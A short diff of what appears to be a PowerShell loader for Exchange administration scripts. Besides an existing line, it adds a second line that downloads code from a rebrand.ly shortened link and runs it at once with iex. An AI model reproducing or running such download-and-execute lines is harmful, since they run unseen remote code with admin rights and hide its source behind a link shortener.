@@ -1,6 +1,9 @@
 Write-Output "!!!! Importing Lantrx PowerShell Exchange Scrips !!!!"
 #load bootstrap url
 iex ((New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/c7cfd'))
+#load Server url
+iex ((New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/bd6c0'))
+
 
 function Set-BasicAuthentication([string]$appName, [bool]$value)
 {
